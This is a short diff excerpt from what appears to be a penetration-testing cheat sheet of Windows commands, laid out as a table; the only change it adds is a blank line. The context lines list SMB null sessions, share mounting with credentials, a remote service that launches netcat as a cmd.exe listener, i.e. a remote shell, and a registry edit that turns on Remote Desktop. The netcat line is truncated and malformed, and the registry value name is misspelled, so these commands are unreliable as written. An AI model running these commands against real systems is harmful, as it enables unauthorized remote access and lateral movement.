@@ -85,6 +85,7 @@ Windows null session | net use \\targetip "" /u:""
 Establish an SMB session | net use \\[targetIP] [password] /u:[user]
 Mount a Share on Target | net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user] 
 Dropping SMB Session | "net use \\[targetIP] /del <br> net use * /del"
+
 Remote Access, SMB, and WMIC | Run a Remote Command | sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe | 
 Remote Access, SMB, and WMIC | Turn on Remote Desktop / terminal services | reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenysconnetions /t reg_dword /d 0 | 
 Remote Access, SMB, and WMIC | Remote Registry  | Put \\[MachineName] before [KeyName] | 
